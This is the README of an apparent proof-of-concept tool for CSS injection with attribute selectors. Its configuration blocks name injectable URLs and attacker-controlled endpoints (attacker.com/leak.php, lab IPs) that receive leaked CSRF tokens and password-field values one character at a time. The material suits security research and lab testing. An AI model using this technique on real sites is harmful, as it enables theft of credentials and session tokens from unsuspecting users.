# PoC - CSS Injection : Attribute Selectors 

__Read this in other languages:__ [English](README.md), [Français](README.fr.md)

## Description

PoC for exploiting a CSS injection using attribute selectors to retrieve the value of an attribute of an HTML element.

## Prerequisites

- The vulnerable site must be able to be iframed, see `X-Frame-Options` and `frame-ancestors` HTTP headers.
- There are some limitations when the value to be retrieved starts with a number. The target value must then be surrounded by single or double quotes and exploitation may not be possible if these characters are filtered by the application.

## Configuration

Before using the PoC, adapt the following values:

```
/* ==== CONFIG ==== */
// Full URL of the vulnerable application
const RURL = "http://192.168.56.101/css-injection/partie1/css-injection-element-hidden.php?color=red;}";  

// URL of the attacker's machine to retrieve the already known characters
const LURL_KNOWNCHARS = "http://192.168.56.102/css-injection/partie1/poc/knownChars.php";

// URL of the attacker's machine to indicate a new identified character
const LURL_LEAKCHAR = "http://192.168.56.102/css-injection/partie1/poc/leak.php?char=";

// Name of the targeted HTML element
const HTML_ELEMENT_NAME = "input";

// Name of the targeted HTML attribute
const HTML_ATTRIBUTE_NAME = "name";

// NAME value of the targeted HTML attribute
const HTML_ATTRIBUTE_VALUE = "csrf-token";

// True if the targeted field is of type "hidden" (use of CSS combinators ~*)
const isHiddenTypeElement = true;

// When the characters "'" and """ are filtered by the application it's not possible to retrieve a value starting with a number
const isQuoteFiltered = true;
```

## Usage

### Retrieving a value from a password field

```javascript
const RURL = "http://vulnerable.com/targets/password.php?color=red;}";  
const LURL_KNOWNCHARS = "http://attacker.com/knownChars.php";
const LURL_LEAKCHAR = "http://attacker.com/leak.php?char=";
const HTML_ELEMENT_NAME = "input";
const HTML_ATTRIBUTE_NAME = "name";
const HTML_ATTRIBUTE_VALUE = "password";
const isHiddenTypeElement = false;
const isQuoteFiltered = false;
```

### Retrieving a value from a hidden field

```javascript
const RURL = "http://vulnerable.com/targets/password.php?color=red;}";  
const LURL_KNOWNCHARS = "http://attacker.com/knownChars.php";
const LURL_LEAKCHAR = "http://attacker.com/leak.php?char=";
const HTML_ELEMENT_NAME = "input";
const HTML_ATTRIBUTE_NAME = "name";
const HTML_ATTRIBUTE_VALUE = "csrf-token";
const isHiddenTypeElement = true;
const isQuoteFiltered = false;
```

## Demo

### Retrieving a value from a password field

![](https://github.com/Sharpforce/PoC-CSS-injection-with-attribute-selector/blob/master/Resources/password.gif)

### Retrieving a value from a hidden field

![](https://github.com/Sharpforce/PoC-CSS-injection-with-attribute-selector/blob/master/Resources/hidden.gif)